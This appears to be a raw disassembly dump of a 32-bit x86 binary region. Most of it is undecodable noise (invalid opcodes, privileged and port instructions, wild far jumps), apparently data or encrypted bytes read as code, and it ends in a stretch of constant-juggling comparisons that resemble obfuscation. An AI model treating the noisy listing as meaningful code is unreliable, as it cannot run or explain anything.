  41b8e5:	mov    es,WORD PTR [edi]
  41b8e7:	test   eax,0xf3abd206
  41b8ec:	ret    
  41b8ed:	xchg   esp,eax
  41b8ee:	arpl   WORD PTR [edx],sp
  41b8f0:	push   ebp
  41b8f1:	jne    0x41b94d
  41b8f3:	pop    ss
  41b8f4:	cmp    al,BYTE PTR [eax+0x46baeb45]
  41b8fa:	or     edi,DWORD PTR [ebp+0x356c4a9f]
  41b900:	cli    
  41b901:	jmp    0xa8eea61
  41b906:	mov    bh,0x8f
  41b908:	imul   ecx,ebp,0xffffffe5
  41b90b:	mov    eax,ds:0x2221194d
  41b910:	pop    esp
  41b911:	daa    
  41b912:	or     edi,DWORD PTR [edx]
  41b914:	pop    ss
  41b915:	jo     0x41b8fd
  41b917:	je     0x41b8c4
  41b919:	sub    DWORD PTR [esi-0x2d8a384],edi
  41b91f:	sbb    dl,ch
  41b921:	data16 jo 0x41b8d2
  41b924:	and    al,0x8d
  41b926:	mov    ds:0xfa2bcc1a,al
  41b92b:	xchg   ebx,eax
  41b92c:	push   edi
  41b92d:	cmc    
  41b92e:	mov    al,0x1c
  41b930:	mov    cr1,edx
  41b933:	outs   dx,BYTE PTR ds:[esi]
  41b934:	cmc    
  41b935:	sbb    edi,DWORD PTR [ebx-0x4cc48126]
  41b93b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b93c:	jbe    0x41b9a2
  41b93e:	push   ds
  41b93f:	dec    edx
  41b940:	dec    ebp
  41b941:	jmp    0x41b8ec
  41b943:	inc    eax
  41b944:	adc    DWORD PTR ds:0x2bb9b677,0xb281df45
  41b94e:	retf   
  41b94f:	and    BYTE PTR [edi-0x52],bh
  41b952:	rol    ch,0xda
  41b955:	pop    ds
  41b956:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b957:	and    bl,bh
  41b959:	jmp    DWORD PTR [esi-0x66]
  41b95c:	push   0x757a1afe
  41b961:	sti    
  41b962:	dec    ecx
  41b963:	ret    0x3c1e
  41b966:	test   ch,dl
  41b968:	(bad)  
  41b969:	sbb    bl,dl
  41b96b:	or     al,BYTE PTR [eax]
  41b96d:	scas   eax,DWORD PTR es:[edi]
  41b96e:	mov    dl,0xaa
  41b970:	mov    eax,0x176fbe52
  41b975:	enter  0xf797,0x45
  41b979:	sbb    ecx,0xeaf69f08
  41b97f:	popa   
  41b980:	sbb    al,0x5b
  41b982:	inc    eax
  41b983:	rol    BYTE PTR [edi-0x42],0x6
  41b987:	and    DWORD PTR [ecx],0x19
  41b98a:	imul   eax,DWORD PTR [ebp-0x45061891],0xffffffc7
  41b991:	sub    bl,BYTE PTR [ecx+0x5788f94c]
  41b997:	(bad)  
  41b998:	cli    
  41b999:	jle    0x41b961
  41b99b:	ds ja  0x41ba00
  41b99e:	xchg   ecx,eax
  41b99f:	jecxz  0x41ba06
  41b9a1:	xchg   esi,eax
  41b9a2:	std    
  41b9a3:	add    ch,BYTE PTR [eax-0x26]
  41b9a6:	test   eax,0xf0020a6a
  41b9ab:	test   cl,cl
  41b9ad:	lahf   
  41b9ae:	pop    edi
  41b9af:	pop    esi
  41b9b0:	pop    eax
  41b9b1:	xchg   DWORD PTR [ebp-0x18],edi
  41b9b4:	mov    dl,0x66
  41b9b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9b7:	lea    esi,[eax]
  41b9b9:	inc    esp
  41b9ba:	sbb    BYTE PTR [esi+0x37],ah
  41b9bd:	cmp    cl,BYTE PTR [ebp+0x46385a62]
  41b9c3:	div    BYTE PTR [ebp-0x6a1e9056]
  41b9c9:	retf   0x86c6
  41b9cc:	or     eax,0x5de39060
  41b9d1:	les    edi,FWORD PTR [esp+eax*1]
  41b9d4:	sbb    al,0xe
  41b9d6:	in     eax,dx
  41b9d7:	inc    eax
  41b9d8:	fisubr DWORD PTR [edx+0x3]
  41b9db:	fcom   QWORD PTR [eax]
  41b9dd:	push   es
  41b9de:	mov    eax,ds:0x7cab9097
  41b9e3:	xchg   DWORD PTR [eax+0x71],ebp
  41b9e6:	cld    
  41b9e7:	mov    ch,0x77
  41b9e9:	pop    edi
  41b9ea:	and    DWORD PTR [eax+0x65],esp
  41b9ed:	lahf   
  41b9ee:	inc    edx
  41b9ef:	repnz adc ah,BYTE PTR fs:[ecx-0x2b7e77df]
  41b9f7:	mov    BYTE PTR [ebx],0x6b
  41b9fa:	cmp    eax,DWORD PTR [ecx]
  41b9fc:	ins    BYTE PTR es:[edi],dx
  41b9fd:	pop    ss
  41b9fe:	pushf  
  41b9ff:	sbb    ah,dh
  41ba01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba02:	adc    eax,0x5934891e
  41ba07:	mul    DWORD PTR [esi]
  41ba09:	imul   eax,ebp,0xffffffac
  41ba0c:	and    edi,DWORD PTR [eax]
  41ba0e:	popa   
  41ba0f:	mov    esp,0x48f5cd43
  41ba14:	adc    BYTE PTR [esi-0x69],dl
  41ba17:	sbb    esi,ebp
  41ba19:	aas    
  41ba1a:	mov    dl,0x71
  41ba1c:	outs   dx,BYTE PTR ds:[esi]
  41ba1d:	mov    eax,0xcf516043
  41ba22:	or     esi,DWORD PTR [eax+0x48c2944e]
  41ba28:	in     eax,0x23
  41ba2a:	pop    edi
  41ba2b:	or     dh,BYTE PTR [edx-0x97bfcc7]
  41ba31:	mov    esp,0x1f3acbad
  41ba36:	or     bh,BYTE PTR [edi+0x39]
  41ba39:	cmp    DWORD PTR [edx+0x3a],esp
  41ba3c:	dec    eax
  41ba3d:	aam    0xf2
  41ba3f:	sbb    al,bl
  41ba41:	sbb    eax,0xc8de199d
  41ba46:	outs   dx,BYTE PTR ds:[esi]
  41ba47:	inc    ecx
  41ba48:	dec    ebx
  41ba49:	xchg   edx,eax
  41ba4a:	stos   DWORD PTR es:[edi],eax
  41ba4b:	adc    ebx,DWORD PTR [esi+ebp*4+0x1e2bba34]
  41ba52:	arpl   WORD PTR [ebx],ax
  41ba54:	mov    al,0x24
  41ba56:	(bad)  
  41ba57:	(bad)  
  41ba58:	jo     0x41baca
  41ba5a:	cmp    esi,DWORD PTR [edx-0xff1c313]
  41ba60:	in     al,0x4b
  41ba62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba63:	cmc    
  41ba64:	pop    es
  41ba65:	icebp  
  41ba66:	sar    DWORD PTR [bx+di],cl
  41ba69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba6a:	add    BYTE PTR [ebp+ebp*8+0x2b],bh
  41ba6e:	js     0x41ba32
  41ba70:	stos   DWORD PTR es:[edi],eax
  41ba71:	sbb    bh,al
  41ba73:	ss cmp bl,0xe9
  41ba77:	push   es
  41ba78:	aas    
  41ba79:	addr16 push ecx
  41ba7b:	call   0xb2062803
  41ba80:	xor    BYTE PTR [edi+ebx*2+0x29],dl
  41ba84:	data16 sbb BYTE PTR [edi+0x3e2b23f6],cl
  41ba8b:	nop
  41ba8c:	hlt    
  41ba8d:	mov    dh,0xf1
  41ba8f:	int    0x33
  41ba91:	inc    edi
  41ba92:	xchg   DWORD PTR [eax],esp
  41ba94:	jg     0x41ba79
  41ba96:	mov    ch,0xf0
  41ba98:	xchg   BYTE PTR [esi+0x15a885d7],al
  41ba9e:	enter  0x8bd,0xf
  41baa2:	pushf  
  41baa3:	jge    0x41baa6
  41baa5:	rcr    BYTE PTR [eax],0x77
  41baa8:	lods   eax,DWORD PTR ds:[esi]
  41baa9:	aas    
  41baaa:	xor    edi,DWORD PTR [ecx-0x2df5e633]
  41bab0:	imul   esp,DWORD PTR [ebx+0x34],0xffffffd4
  41bab4:	adc    DWORD PTR [ecx],ecx
  41bab6:	or     esp,ebx
  41bab8:	mov    bh,0x91
  41baba:	mov    ds:0x8ab2fd7a,eax
  41babf:	ins    BYTE PTR es:[edi],dx
  41bac0:	jne    0x41bb33
  41bac2:	mov    ch,BYTE PTR [edx]
  41bac4:	push   esi
  41bac5:	xlat   BYTE PTR ds:[ebx]
  41bac6:	xor    ebx,DWORD PTR [esp+ebp*4]
  41bac9:	jno    0x41ba60
  41bacb:	mov    ecx,0x91c84435
  41bad0:	cdq    
  41bad1:	es mov ebx,0xa19bf3a9
  41bad7:	leave  
  41bad8:	outs   dx,BYTE PTR ds:[esi]
  41bad9:	jns    0x41bb5a
  41badb:	stos   DWORD PTR es:[edi],eax
  41badc:	lds    ebx,FWORD PTR [edi-0x28dcbcd3]
  41bae2:	test   BYTE PTR [edx+0xa],dl
  41bae5:	je     0x41baae
  41bae7:	repnz das 
  41bae9:	mov    ds:0x4b49f682,al
  41baee:	adc    ebx,esp
  41baf0:	xor    edx,DWORD PTR [esi+0x4c]
  41baf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baf4:	inc    esi
  41baf5:	xchg   ecx,eax
  41baf6:	(bad)  
  41baf7:	(bad)  
  41baf9:	and    edx,DWORD PTR [ebx+0x2b16209]
  41baff:	sub    eax,0x6b174a53
  41bb04:	retf   0x21ce
  41bb07:	mov    dl,0x87
  41bb09:	cld    
  41bb0a:	cmp    ebp,DWORD PTR ds:0x56296819
  41bb10:	fst    DWORD PTR [ebp-0x1a]
  41bb13:	push   ebx
  41bb14:	jg     0x41baad
  41bb16:	jecxz  0x41bab2
  41bb18:	add    eax,0xdcbd45a9
  41bb1d:	jl     0x41bb73
  41bb1f:	inc    edx
  41bb20:	outs   dx,BYTE PTR ds:[esi]
  41bb21:	mov    bh,0x2e
  41bb23:	inc    esi
  41bb24:	dec    ecx
  41bb25:	popf   
  41bb26:	in     eax,dx
  41bb27:	mov    ch,0x14
  41bb29:	or     bl,0x37
  41bb2c:	outs   dx,DWORD PTR ds:[si]
  41bb2e:	mov    edx,0x8c5ddc71
  41bb33:	into   
  41bb34:	push   edi
  41bb35:	cmp    esp,eax
  41bb37:	aad    0xd2
  41bb39:	adc    al,0x8d
  41bb3b:	repz repnz out 0xab,al
  41bb3f:	int    0xe0
  41bb41:	div    DWORD PTR [edi+0x74]
  41bb44:	mov    BYTE PTR [ebx+0x70],bh
  41bb47:	int3   
  41bb48:	loopne 0x41bbb2
  41bb4a:	xchg   edi,eax
  41bb4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb4c:	test   al,0x7c
  41bb4e:	mov    edi,0x9dc14148
  41bb53:	jne    0x41baee
  41bb55:	inc    esp
  41bb56:	pop    ebx
  41bb57:	push   eax
  41bb58:	or     DWORD PTR [ebx-0x4f02db50],ebx
  41bb5e:	mov    esi,0x4c96d40d
  41bb63:	sub    DWORD PTR [esi],edi
  41bb65:	test   DWORD PTR [esi+0x76d009d9],edi
  41bb6b:	and    al,0x41
  41bb6d:	xor    DWORD PTR [esp+ebp*4+0x678da753],eax
  41bb74:	daa    
  41bb75:	sbb    BYTE PTR [esi-0x1d],al
  41bb78:	stc    
  41bb79:	fwait
  41bb7a:	loopne 0x41bb25
  41bb7c:	xor    BYTE PTR [edx],bl
  41bb7e:	imul   ecx,DWORD PTR [edx-0x6c],0xffffffbb
  41bb82:	dec    esp
  41bb83:	jne    0x41bba6
  41bb85:	int    0x7
  41bb87:	cs loope 0x41bb26
  41bb8a:	sub    BYTE PTR [edx+eiz*2],bl
  41bb8d:	add    BYTE PTR [ebp-0xff23ca7],0xc3
  41bb94:	pop    esi
  41bb95:	adc    al,0xb5
  41bb97:	addr16 out 0x36,al
  41bb9a:	aam    0xcc
  41bb9c:	dec    edi
  41bb9d:	cmp    esp,DWORD PTR [edi-0x33]
  41bba0:	inc    eax
  41bba1:	or     BYTE PTR [ebx+esi*8],dl
  41bba4:	test   DWORD PTR [edi],edx
  41bba6:	neg    DWORD PTR [ebx+esi*2]
  41bba9:	mov    dl,0x2a
  41bbab:	hlt    
  41bbac:	mov    ds:0xc761a596,eax
  41bbb1:	push   ebx
  41bbb2:	xchg   esi,eax
  41bbb3:	aam    0x71
  41bbb5:	jmp    DWORD PTR [ebx+edi*8-0x7b92132d]
  41bbbc:	xchg   DWORD PTR [esp+esi*2-0x1484c29d],ebp
  41bbc3:	jae    0x41bbf0
  41bbc5:	or     eax,0x55b036c8
  41bbca:	jg     0x41bbdc
  41bbcc:	pushf  
  41bbcd:	jno    0x41bc1f
  41bbcf:	jbe    0x41bbae
  41bbd1:	fsub   QWORD PTR [esi+0x23]
  41bbd4:	retf   0x8b66
  41bbd7:	push   esp
  41bbd8:	and    al,0x24
  41bbda:	or     cx,dx
  41bbdd:	mov    dx,WORD PTR [esp+0x2c]
  41bbe2:	add    cx,dx
  41bbe5:	or     ecx,0x3b22
  41bbeb:	mov    WORD PTR [esp+0x3c],cx
  41bbf0:	jmp    0x41bfbf
  41bbf5:	inc    edx
  41bbf6:	pop    edx
  41bbf7:	push   ecx
  41bbf8:	fwait
  41bbf9:	xor    DWORD PTR [edx+0x237b5a22],ebx
  41bbff:	pop    ecx
  41bc00:	stos   BYTE PTR es:[edi],al
  41bc01:	ret    
  41bc02:	sub    BYTE PTR [edi+0x7e],cl
  41bc05:	add    eax,DWORD PTR [ecx+0x12bc1816]
  41bc0b:	sbb    BYTE PTR [eax],bl
  41bc0d:	push   ss
  41bc0e:	sbb    eax,0x7789f7f7
  41bc13:	push   ds
  41bc14:	fs adc al,0x2b
  41bc17:	add    ch,dl
  41bc19:	mov    ds:0x7f12e63c,al
  41bc1e:	sub    edi,DWORD PTR [eax-0x25519a99]
  41bc24:	in     al,dx
  41bc25:	imul   edi,DWORD PTR [edx-0x2d]
  41bc29:	outs   dx,BYTE PTR ds:[esi]
  41bc2a:	xor    ah,BYTE PTR [edx-0x53]
  41bc2d:	fwait
  41bc2e:	jl     0x41bbdc
  41bc30:	dec    edx
  41bc31:	sub    eax,0x75f4460b
  41bc36:	jno    0x41bc3c
  41bc38:	ins    DWORD PTR es:[edi],dx
  41bc39:	push   eax
  41bc3a:	mov    BYTE PTR [esi+eiz*1],al
  41bc3d:	or     DWORD PTR [ebx-0x75],esi
  41bc40:	sbb    al,BYTE PTR [ebx+0x1d1176d5]
  41bc46:	sub    bl,bl
  41bc48:	call   0x46062544
  41bc4d:	(bad)  
  41bc4e:	push   edx
  41bc4f:	xor    eax,0xd047db6d
  41bc54:	adc    eax,0x6eb1fa09
  41bc59:	sub    DWORD PTR [ebx],edi
  41bc5b:	pop    edi
  41bc5c:	iret   
  41bc5d:	mov    esi,0xe040b253
  41bc62:	mov    esp,edx
  41bc64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc65:	shl    BYTE PTR [ebx-0x4db20b39],cl
  41bc6b:	sar    BYTE PTR ds:0x1db4baf0,0xe8
  41bc72:	fisttp QWORD PTR [ebp-0x4c0f3704]
  41bc78:	out    0xc7,eax
  41bc7a:	mov    bl,0x3e
  41bc7c:	bound  ecx,QWORD PTR [ecx+0x7e4c8fbe]
  41bc82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc83:	das    
  41bc84:	ffreep st(4)
  41bc86:	dec    ecx
  41bc87:	dec    edi
  41bc88:	mov    edx,0x5be94b1a
  41bc8d:	ret    
  41bc8e:	loope  0x41bc99
  41bc90:	sbb    eax,0x7e4bf7cc
  41bc95:	cmp    eax,0x36da1cc7
  41bc9a:	loope  0x41bc71
  41bc9c:	retf   0x332b
  41bc9f:	xor    eax,0xb4f2a69
  41bca4:	push   ds
  41bca5:	sub    BYTE PTR [ebx-0x42],0x42
  41bca9:	test   DWORD PTR [eax],esi
  41bcab:	clc    
  41bcac:	mov    ah,0x28
  41bcae:	mov    dl,0xd7
  41bcb0:	dec    ecx
  41bcb1:	int    0xa0
  41bcb3:	add    edx,ecx
  41bcb5:	(bad)  
  41bcb6:	and    bl,BYTE PTR [edx]
  41bcb8:	sahf   
  41bcb9:	xchg   edi,ebp
  41bcbb:	js     0x41bcaa
  41bcbd:	xchg   esi,eax
  41bcbe:	push   esp
  41bcbf:	jg     0x41bcae
  41bcc1:	mov    al,ah
  41bcc3:	cwde   
  41bcc4:	fsub   st(6),st
  41bcc6:	dec    ebp
  41bcc7:	sub    DWORD PTR [esi-0x78e8e48f],eax
  41bccd:	xor    eax,0x3d927d9d
  41bcd2:	ja     0x41bd0f
  41bcd4:	pop    esp
  41bcd5:	jp     0x41bd45
  41bcd7:	outs   dx,DWORD PTR ds:[esi]
  41bcd8:	xchg   BYTE PTR [eax+edx*4],bh
  41bcdb:	test   al,0x25
  41bcdd:	arpl   WORD PTR [ecx+0x270f6b6d],bp
  41bce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bce4:	jecxz  0x41bd2d
  41bce6:	test   DWORD PTR [edi+0x2c],edi
  41bce9:	mov    al,ds:0xb7d50112
  41bcee:	mov    edx,0x553abd5f
  41bcf3:	xor    bl,dh
  41bcf5:	pop    ebx
  41bcf6:	retf   
  41bcf7:	pop    eax
  41bcf8:	sub    edi,DWORD PTR [ecx-0x25]
  41bcfb:	mov    al,ds:0xa5718023
  41bd00:	call   0x3094:0xfcd279c
  41bd07:	mov    ecx,DWORD PTR [ecx-0x2c]
  41bd0a:	lahf   
  41bd0b:	cli    
  41bd0c:	or     eax,0x851ec38f
  41bd11:	xor    eax,0xa45a18af
  41bd16:	int3   
  41bd17:	fmul   DWORD PTR [ebx]
  41bd19:	and    al,0x60
  41bd1b:	mov    bh,0x3f
  41bd1d:	sbb    dl,cl
  41bd1f:	pop    edi
  41bd20:	xor    BYTE PTR [edx+0x7b850aa9],al
  41bd26:	xor    al,BYTE PTR [ecx+0x48]
  41bd29:	xchg   edi,eax
  41bd2a:	adc    BYTE PTR [eax-0xd5d06ec],ch
  41bd30:	adc    al,0x69
  41bd32:	push   ebp
  41bd33:	lods   al,BYTE PTR ds:[esi]
  41bd34:	or     eax,0x716ddfe8
  41bd39:	mov    al,ds:0x85bea516
  41bd3e:	dec    eax
  41bd3f:	jnp    0x41bd79
  41bd41:	push   ebx
  41bd42:	xlat   BYTE PTR ds:[ebx]
  41bd43:	div    BYTE PTR [esp+ebx*1-0x4da94c3a]
  41bd4a:	push   eax
  41bd4b:	pop    ebp
  41bd4c:	inc    edi
  41bd4d:	mov    bh,0xf2
  41bd4f:	cpuid  
  41bd51:	add    BYTE PTR [edi+ecx*1+0x268514a8],bh
  41bd58:	xchg   edx,eax
  41bd59:	and    eax,0x344be6c0
  41bd5e:	inc    esi
  41bd5f:	mov    eax,0x17fa0882
  41bd64:	loop   0x41bd25
  41bd66:	jmp    0x2a34:0x6a93cbc
  41bd6d:	mov    esi,eax
  41bd6f:	fsubr  DWORD PTR [edi]
  41bd71:	repnz pop ebp
  41bd73:	mov    ebp,0x1ab1a638
  41bd78:	jge    0x41bd4b
  41bd7a:	and    BYTE PTR [ecx-0x2],bh
  41bd7d:	pusha  
  41bd7e:	xchg   edi,eax
  41bd7f:	fs clc 
  41bd81:	jo     0x41bda0
  41bd83:	or     DWORD PTR ds:0x3c21f574,esp
  41bd89:	push   ecx
  41bd8a:	(bad)  
  41bd8b:	hlt    
  41bd8c:	int    0x7e
  41bd8e:	mov    BYTE PTR [ecx+edi*1-0x5bf016b3],cl
  41bd95:	xchg   DWORD PTR [esi+0x330471bc],esi
  41bd9b:	out    dx,al
  41bd9c:	mov    ch,0xd5
  41bd9e:	div    BYTE PTR [ebx]
  41bda0:	mov    al,ds:0x52a62adc
  41bda5:	cmp    eax,DWORD PTR [ebp+ebp*2-0x7466e26a]
  41bdac:	mov    ecx,0x383f91e2
  41bdb1:	repz shl DWORD PTR [ecx],0xc
  41bdb5:	xlat   BYTE PTR ds:[ebx]
  41bdb6:	test   DWORD PTR [esi-0x49],ebx
  41bdb9:	mov    DWORD PTR [edi-0x7010c373],ebp
  41bdbf:	adc    ch,0xd9
  41bdc2:	pop    edi
  41bdc3:	sbb    DWORD PTR [eax-0x28],esi
  41bdc6:	fmul   DWORD PTR gs:[edx+0x2952f6aa]
  41bdcd:	mov    edi,0xe5f6bf45
  41bdd2:	rcr    BYTE PTR [edx+0x694a7774],0x36
  41bdd9:	test   BYTE PTR [edi-0xec9ec17],ah
  41bddf:	out    0x68,eax
  41bde1:	mov    WORD PTR [ebx-0x39],ss
  41bde4:	call   0x976:0x68d002fa
  41bdeb:	in     al,dx
  41bdec:	adc    al,0xbf
  41bdee:	ja     0x41bdf7
  41bdf0:	mov    ebx,edi
  41bdf2:	stc    
  41bdf3:	ja     0x41bdb1
  41bdf5:	aam    0x5b
  41bdf7:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41bdf9:	xor    al,0xf3
  41bdfb:	jmp    0x497974de
  41be00:	not    ebp
  41be02:	nop
  41be03:	and    BYTE PTR [ebx+0xa517ca2],0x73
  41be0a:	stos   BYTE PTR es:[edi],al
  41be0b:	jecxz  0x41bdb1
  41be0d:	aaa    
  41be0e:	cdq    
  41be0f:	sti    
  41be10:	and    al,0xd0
  41be12:	add    DWORD PTR ds:0x6c4366a0,edx
  41be18:	je     0x41be93
  41be1a:	imul   eax,ebp,0xffffff9a
  41be1d:	scas   al,BYTE PTR es:[edi]
  41be1e:	sti    
  41be1f:	test   edi,0x9139002c
  41be25:	push   ebx
  41be26:	sti    
  41be27:	ss mov cl,0xe9
  41be2a:	data16 sahf 
  41be2c:	mov    ebp,0x5f795a9
  41be31:	and    esp,0x7a
  41be34:	mov    dh,0x59
  41be36:	xchg   edi,eax
  41be37:	call   0x4f595dff
  41be3c:	dec    edi
  41be3d:	jbe    0x41be36
  41be3f:	ret    0x4931
  41be42:	mov    edi,DWORD PTR [edi]
  41be44:	fstp   DWORD PTR [esi]
  41be46:	sub    dh,dh
  41be48:	cs sbb ebx,ebp
  41be4b:	mov    al,0x8b
  41be4d:	cld    
  41be4e:	push   ebx
  41be4f:	lea    esi,[esi+edx*4]
  41be52:	mov    esp,0xea47afd6
  41be57:	xchg   edi,eax
  41be58:	cmp    BYTE PTR [esi-0xb],ah
  41be5b:	adc    eax,0xccdf0bb0
  41be60:	call   0x9e28ebd
  41be65:	ins    DWORD PTR es:[edi],dx
  41be66:	pop    ebp
  41be67:	fdivrp st(6),st
  41be69:	or     ecx,DWORD PTR [ecx+ecx*1-0x56]
  41be6d:	jne    0x41be55
  41be6f:	or     eax,0xa3314298
  41be74:	push   cs
  41be75:	or     ecx,DWORD PTR [eax+0x427c5e59]
  41be7b:	push   edx
  41be7c:	adc    bh,BYTE PTR [ebx]
  41be7e:	or     BYTE PTR [ebx+eax*1+0x66fde7cd],ah
  41be85:	xor    esi,DWORD PTR [ebx-0x727dc1a]
  41be8b:	popa   
  41be8c:	ja     0x41beec
  41be8e:	imul   edi,DWORD PTR [esi-0x73e7c5c9],0x43
  41be95:	addr16 jnp 0x41bea9
  41be98:	or     al,0x6e
  41be9a:	sbb    dl,BYTE PTR [ebp-0xb76bd14]
  41bea0:	mov    esi,0x1a7afa52
  41bea5:	inc    edi
  41bea6:	int    0xe1
  41bea8:	pop    ebp
  41bea9:	and    DWORD PTR [ecx-0x54194283],edi
  41beaf:	fucomi st,st(2)
  41beb1:	loop   0x41be78
  41beb3:	mov    DWORD PTR [eax+0x2c],0xc0283755
  41beba:	div    DWORD PTR [eax-0x689374f5]
  41bec0:	in     al,dx
  41bec1:	or     al,BYTE PTR [esi-0x703d83f6]
  41bec7:	addr16 es out 0x91,eax
  41becb:	repnz stos DWORD PTR es:[edi],eax
  41becd:	and    al,0xa4
  41becf:	neg    DWORD PTR [edi+ebp*1]
  41bed2:	out    dx,eax
  41bed3:	rol    BYTE PTR [eax-0x5c6419eb],1
  41bed9:	mov    bh,0x7d
  41bedb:	aad    0xdc
  41bedd:	add    al,0x2a
  41bedf:	jno    0x41bf37
  41bee1:	pop    ss
  41bee2:	loopne 0x41bf1b
  41bee4:	cmp    bl,BYTE PTR [edi+edx*8+0x11]
  41bee8:	jbe    0x41bea6
  41beea:	xlat   BYTE PTR ds:[ebx]
  41beeb:	dec    ebp
  41beec:	mov    eax,0x11b8f6b5
  41bef1:	push   esi
  41bef2:	in     al,dx
  41bef3:	sahf   
  41bef4:	out    0x2b,al
  41bef6:	jmp    0x69ffd265
  41befb:	(bad)  
  41befc:	gs je  0x41bf0d
  41beff:	cs jmp 0x619f11eb
  41bf05:	outs   dx,BYTE PTR ds:[esi]
  41bf06:	sbb    BYTE PTR [ebx],0x4b
  41bf09:	mov    WORD PTR [ecx-0x5],?
  41bf0c:	mov    esp,0x6de6254d
  41bf11:	mov    cl,0x16
  41bf13:	cmc    
  41bf14:	jp     0x41bedd
  41bf16:	mov    bl,dl
  41bf18:	jnp    0x41bf3c
  41bf1a:	ja     0x41beea
  41bf1c:	ret    0xdb54
  41bf1f:	mov    dh,0x7
  41bf21:	test   al,0xb4
  41bf23:	xchg   dl,bh
  41bf25:	je     0x41beaa
  41bf27:	inc    ecx
  41bf28:	test   BYTE PTR [esi],0xdd
  41bf2b:	(bad)  
  41bf2c:	push   ss
  41bf2d:	imul   ebp,DWORD PTR [esi+esi*4],0x4a20fc5e
  41bf34:	and    DWORD PTR [edi],ecx
  41bf36:	pop    es
  41bf37:	fwait
  41bf38:	jmp    0x4301:0xc7d29276
  41bf3f:	je     0x41bed1
  41bf41:	frstor [ebx+ecx*4-0x70]
  41bf45:	inc    si
  41bf47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf48:	enter  0x46f7,0xbc
  41bf4c:	retf   
  41bf4d:	adc    al,0xfc
  41bf4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf50:	push   esp
  41bf51:	push   ebp
  41bf52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf53:	jmp    0x847f:0xac930f9a
  41bf5a:	dec    esi
  41bf5b:	pop    edx
  41bf5c:	mov    ah,0x34
  41bf5e:	jle    0x41bf07
  41bf60:	mov    dl,0x72
  41bf62:	add    DWORD PTR [edi-0x77],edx
  41bf65:	les    esi,FWORD PTR [esi+edx*1+0x50]
  41bf69:	or     DWORD PTR [edi-0x10],ebp
  41bf6c:	xor    bl,BYTE PTR [edx-0x69]
  41bf6f:	xchg   esi,eax
  41bf70:	adc    BYTE PTR [esi+0x58],dh
  41bf73:	in     eax,dx
  41bf74:	cmp    esp,DWORD PTR [edi]
  41bf76:	mov    ds:0x960c0f16,al
  41bf7b:	adc    BYTE PTR [ecx+0x67],dh
  41bf7e:	sbb    BYTE PTR [ecx],bh
  41bf80:	es repnz dec ecx
  41bf83:	mov    DWORD PTR [edi-0x75df6d5b],esi
  41bf89:	lds    edi,FWORD PTR [edi]
  41bf8b:	and    edx,DWORD PTR [ebx+0x4541bf9c]
  41bf91:	cmp    dl,dl
  41bf93:	setp   BYTE PTR [esi+0x30c3b972]
  41bf9a:	sbb    edi,DWORD PTR [ecx-0x55]
  41bf9d:	cmp    esp,esp
  41bf9f:	(bad)  
  41bfa0:	fcmovb st,st(3)
  41bfa2:	pop    ebx
  41bfa3:	sub    BYTE PTR [esi],bl
  41bfa5:	pop    edi
  41bfa6:	sub    BYTE PTR [edx-0x193d2a7c],0xf2
  41bfad:	into   
  41bfae:	cmp    ebx,ecx
  41bfb0:	lods   eax,DWORD PTR ds:[esi]
  41bfb1:	pop    es
  41bfb2:	sub    BYTE PTR [ecx+0x23],cl
  41bfb5:	call   0xd343:0x25697332
  41bfbc:	inc    ebx
  41bfbd:	imul   ebp,DWORD PTR [ecx+edi*4],0x57d4
  41bfc4:	mov    WORD PTR [esp+0x2c],cx
  41bfc9:	mov    ecx,0x3b21
  41bfce:	mov    WORD PTR [esp+0x38],cx
  41bfd3:	mov    ecx,0x52fd
  41bfd8:	mov    WORD PTR [esp+0x24],cx
  41bfdd:	mov    ecx,0x2ce0
  41bfe2:	mov    WORD PTR [esp+0xc],cx
  41bfe7:	mov    cx,WORD PTR [esp+0xc]
  41bfec:	mov    dx,WORD PTR [esp+0x24]
  41bff1:	or     cx,dx
  41bff4:	mov    edx,0x21a4
  41bff9:	or     cx,dx
  41bffc:	mov    dx,WORD PTR [esp+0x2c]
  41c001:	sub    cx,dx
  41c004:	mov    dx,WORD PTR [esp+0x38]
  41c009:	sub    cx,dx
  41c00c:	mov    dx,WORD PTR [esp+0x3c]
  41c011:	cmp    dx,cx
  41c014:	jbe    0x41c888
  41c01a:	mov    ecx,0x5008
  41c01f:	mov    WORD PTR [esp+0x24],cx
  41c024:	mov    ecx,0x60ce
  41c029:	mov    WORD PTR [esp+0xc],cx
  41c02e:	movzx  ecx,WORD PTR [esp+0xc]
  41c033:	mov    edx,0x2095
  41c038:	or     cx,dx
  41c03b:	mov    dx,WORD PTR [esp+0x24]
  41c040:	sub    cx,dx
  41c043:	mov    edx,0x10de
  41c048:	or     ecx,0x742f
  41c04e:	imul   ecx,ecx,0x30b2
  41c054:	mov    WORD PTR [esp+0x3c],cx
  41c059:	mov    ecx,0x6143
  41c05e:	mov    WORD PTR [esp+0x38],cx
  41c063:	mov    ecx,0x679f
  41c068:	mov    WORD PTR [esp+0x2c],cx
  41c06d:	mov    ecx,0x1210
  41c072:	mov    WORD PTR [esp+0x24],cx
  41c077:	mov    ecx,0x3308
  41c07c:	mov    WORD PTR [esp+0xc],cx
  41c081:	mov    cx,WORD PTR [esp+0xc]
  41c086:	sub    cx,dx
  41c089:	mov    dx,WORD PTR [esp+0x24]
  41c08e:	xor    cx,dx
  41c091:	mov    dx,WORD PTR [esp+0x2c]
  41c096:	imul   cx,dx
  41c09a:	mov    dx,WORD PTR [esp+0x38]
  41c09f:	and    cx,dx
  41c0a2:	mov    edx,0x694c
  41c0a7:	and    cx,dx
  41c0aa:	mov    dx,WORD PTR [esp+0x3c]
  41c0af:	cmp    dx,cx
  41c0b2:	ja     0x41c888
  41c0b8:	mov    ecx,DWORD PTR [esp+0x18]
